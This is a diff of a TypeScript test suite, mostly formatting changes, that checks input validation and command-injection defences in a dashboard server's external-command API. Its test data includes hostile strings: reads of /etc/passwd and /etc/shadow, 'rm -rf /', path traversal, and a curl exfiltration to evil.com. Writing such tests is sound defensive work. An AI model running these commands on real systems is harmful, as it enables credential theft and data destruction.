@@ -4,13 +4,18 @@
  * Tests all security controls, input validation, sanitization,
  * and security measures implemented for external command execution.
  */
-import { test, expect, describe, beforeEach, afterEach } from 'vitest';
+
 import * as fs from 'node:fs';
-import * as path from 'node:path';
 import * as os from 'node:os';
-import { DashboardServer } from '../../src/server.js';
-import { validateExternalCommand, sanitizeCommandArgs, isValidId } from '../../src/command-executor.js';
+import * as path from 'node:path';
+import { afterEach, beforeEach, describe, expect, test } from 'vitest';
+import {
+  isValidId,
+  sanitizeCommandArgs,
+  validateExternalCommand,
+} from '../../src/command-executor.js';
 import type { DashboardUserConfig, ExternalCommand } from '../../src/config.js';
+import { DashboardServer } from '../../src/server.js';
 
 describe('External Command Execution Security', () => {
   let server: DashboardServer;
@@ -32,7 +37,7 @@ describe('External Command Execution Security', () => {
           description: 'Safe echo command',
           category: 'Test',
           timeout: 5000,
-          allowConcurrent: true
+          allowConcurrent: true,
         },
         'restricted-cmd': {
           name: 'Restricted Command',
@@ -41,9 +46,9 @@ describe('External Command Execution Security', () => {
           description: 'Command with restricted concurrent access',
           category: 'Test',
           timeout: 5000,
-          allowConcurrent: false
-        }
-      }
+          allowConcurrent: false,
+        },
+      },
     };
 
     fs.mkdirSync(config.tracesDir, { recursive: true });
@@ -103,7 +108,7 @@ describe('External Command Execution Security', () => {
         '> /dev/null',
         '< /etc/shadow',
         '../../../etc/passwd',
-        'file; cat /etc/passwd'
+        'file; cat /etc/passwd',
       ];
 
       const sanitizedArgs = sanitizeCommandArgs(dangerousArgs);
@@ -135,7 +140,7 @@ describe('External Command Execution Security', () => {
         description: 'A valid test command',
         category: 'Test',
         timeout: 5000,
-        allowConcurrent: true
+        allowConcurrent: true,
       };
 
       expect(() => validateExternalCommand('valid-cmd', validCommand)).not.toThrow();
@@ -144,33 +149,34 @@ describe('External Command Execution Security', () => {
       const invalidCommands: Array<{ config: Partial<ExternalCommand>; reason: string }> = [
         {
           config: { name: '', command: 'echo', args: [] },
-          reason: 'empty name'
+          reason: 'empty name',
         },
         {
           config: { name: 'Test', command: '', args: [] },
-          reason: 'empty command'
+          reason: 'empty command',
         },
         {
           config: { name: 'Test', command: '../malicious', args: [] },
-          reason: 'dangerous command path'
+          reason: 'dangerous command path',
         },
         {
           config: { name: 'Test', command: 'echo', args: [], timeout: -1 },
-          reason: 'negative timeout'
+          reason: 'negative timeout',
         },
         {
           config: { name: 'Test', command: 'echo', args: [], timeout: 9999999 },
-          reason: 'excessive timeout'
+          reason: 'excessive timeout',
         },
         {
           config: { name: 'Test', command: 'rm', args: ['-rf', '/'] },
-          reason: 'dangerous command with dangerous args'
-        }
+          reason: 'dangerous command with dangerous args',
+        },
       ];
 
       for (const { config, reason } of invalidCommands) {
-        expect(() => validateExternalCommand('test-cmd', config as ExternalCommand))
-          .toThrow(`Invalid command configuration: ${reason}`);
+        expect(() => validateExternalCommand('test-cmd', config as ExternalCommand)).toThrow(
+          `Invalid command configuration: ${reason}`,
+        );
       }
     });
 
@@ -189,14 +195,14 @@ describe('External Command Execution Security', () => {
         // Invalid characters in path
         { path: '/api/external/commands/cmd with spaces/execute', expectedStatus: 400 },
         { path: '/api/external/commands/cmd<script>/execute', expectedStatus: 400 },
-        { path: '/api/external/commands/cmd"quotes"/execute', expectedStatus: 400 }
+        { path: '/api/external/commands/cmd"quotes"/execute', expectedStatus: 400 },
       ];
 
       for (const { path, expectedStatus } of maliciousRequests) {
         const response = await fetch(`${baseUrl}${path}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({})
+          body: JSON.stringify({}),
         });
 
         expect(response.status).toBe(expectedStatus);
@@ -227,7 +233,7 @@ describe('External Command Execution Security', () => {
         const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: payload
+          body: payload,
         });
 
         // Should reject malicious payloads
@@ -243,8 +249,8 @@ describe('External Command Execution Security', () => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          timeout: 999999999 // Extremely large timeout
-        })
+          timeout: 999999999, // Extremely large timeout
+        }),
       });
 
       expect(response.status).toBe(400);
@@ -259,19 +265,22 @@ describe('External Command Execution Security', () => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          additionalArgs: ['&& sleep 2'] // Make it run longer
-        })
+          additionalArgs: ['&& sleep 2'], // Make it run longer
+        }),
       });
 
       // Give it time to start
-      await new Promise(resolve => setTimeout(resolve, 50));
+      await new Promise((resolve) => setTimeout(resolve, 50));
 
       // Try to start another instance - should be rejected
-      const secondResponse = await fetch(`${baseUrl}/api/external/commands/restricted-cmd/execute`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({})
-      });
+      const secondResponse = await fetch(
+        `${baseUrl}/api/external/commands/restricted-cmd/execute`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({}),
+        },
+      );
 
       expect(secondResponse.status).toBe(409); // Conflict
 
@@ -288,8 +297,8 @@ describe('External Command Execution Security', () => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          additionalArgs: ['$PPID', '$USER', '$HOME'] // Try to access parent process info
-        })
+          additionalArgs: ['$PPID', '$USER', '$HOME'], // Try to access parent process info
+        }),
       });
 
       expect(response.status).toBe(200);
@@ -312,7 +321,7 @@ describe('External Command Execution Security', () => {
         ['; curl evil.com/steal?data=$(cat /etc/passwd)'],
         ['& background_attack'],
         ['\n cat /etc/passwd'],
-        ['\r\n malicious_command']
+        ['\r\n malicious_command'],
       ];
 
       for (const args of injectionAttempts) {
@@ -320,8 +329,8 @@ describe('External Command Execution Security', () => {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            additionalArgs: args
-          })
+            additionalArgs: args,
+          }),
         });
 
         expect(response.status).toBe(200); // Command executes but safely
@@ -346,8 +355,8 @@ describe('External Command Execution Security', () => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          additionalArgs: manyArgs
-        })
+          additionalArgs: manyArgs,
+        }),
       });
 
       // Should either execute safely or reject due to limits
@@ -360,7 +369,7 @@ describe('External Command Execution Security', () => {
       const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
         method: 'POST',
         headers: { 'Content-Type': 'text/plain' },
-        body: 'invalid content type'
+        body: 'invalid content type',
       });
 
       expect(response.status).toBe(400);
@@ -373,7 +382,7 @@ describe('External Command Execution Security', () => {
         const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
           method,
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({})
+          body: JSON.stringify({}),
         });
 
         expect(response.status).toBe(405); // Method Not Allowed
@@ -387,14 +396,14 @@ describe('External Command Execution Security', () => {
         '/api/external/commands/safe-echo/',
         '/api/external/commands/safe-echo//execute',
         '/api/external//commands/safe-echo/execute',
-        '/api//external/commands/safe-echo/execute'
+        '/api//external/commands/safe-echo/execute',
       ];
 
       for (const path of invalidPaths) {
         const response = await fetch(`${baseUrl}${path}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({})
+          body: JSON.stringify({}),
         });
 
         expect(response.status).toBeOneOf([400, 404, 405]); // Bad Request, Not Found, or Method Not Allowed
@@ -409,8 +418,8 @@ describe('External Command Execution Security', () => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          additionalArgs: ['test-security-audit']
-        })
+          additionalArgs: ['test-security-audit'],
+        }),
       });
 
       expect(response.status).toBe(200);
@@ -435,14 +444,14 @@ describe('External Command Execution Security', () => {
       const violations = [
         { commandId: '../malicious', expectedStatus: 400 },
         { commandId: 'cmd;injection', expectedStatus: 400 },
-        { commandId: 'non-existent-command', expectedStatus: 404 }
+        { commandId: 'non-existent-command', expectedStatus: 404 },
       ];
 
       for (const { commandId, expectedStatus } of violations) {
         const response = await fetch(`${baseUrl}/api/external/commands/${commandId}/execute`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({})
+          body: JSON.stringify({}),
         });
 
         expect(response.status).toBe(expectedStatus);
@@ -462,20 +471,20 @@ describe('External Command Execution Security', () => {
         {
           path: '/api/external/commands/non-existent/execute',
           expectedError: 'not found',
-          shouldNotContain: ['file system', 'internal path', 'server path', process.cwd()]
+          shouldNotContain: ['file system', 'internal path', 'server path', process.cwd()],
         },
         {
           path: '/api/external/commands/../malicious/execute',
           expectedError: 'Invalid command ID',
-          shouldNotContain: ['file system', 'directory', process.cwd()]
-        }
+          shouldNotContain: ['file system', 'directory', process.cwd()],
+        },
       ];
 
       for (const { path, expectedError, shouldNotContain } of errorScenarios) {
         const response = await fetch(`${baseUrl}${path}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({})
+          body: JSON.stringify({}),
         });
 
         expect(response.status).toBeGreaterThanOrEqual(400);
@@ -501,14 +510,14 @@ describe('External Command Execution Security', () => {
         'null', // JSON null
         'true', // JSON boolean
         '"string"', // JSON string
-        '123' // JSON number
+        '123', // JSON number
       ];
 
       for (const body of malformedRequests) {
         const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body
+          body,
         });
 
         // Should handle gracefully without crashing
@@ -535,9 +544,9 @@ describe('External Command Execution Security', () => {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              additionalArgs: [`request-${i}`]
-            })
-          })
+              additionalArgs: [`request-${i}`],
+            }),
+          }),
         );
       }
 
@@ -559,14 +568,14 @@ describe('External Command Execution Security', () => {
       const largePayload = {
         additionalArgs: new Array(10000).fill('large-argument'),
         context: {
-          data: 'x'.repeat(100000)
-        }
+          data: 'x'.repeat(100000),
+        },
       };
 
       const response = await fetch(`${baseUrl}/api/external/commands/safe-echo/execute`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(largePayload)
+        body: JSON.stringify(largePayload),
       });
 
       // Should reject large payloads to prevent DoS
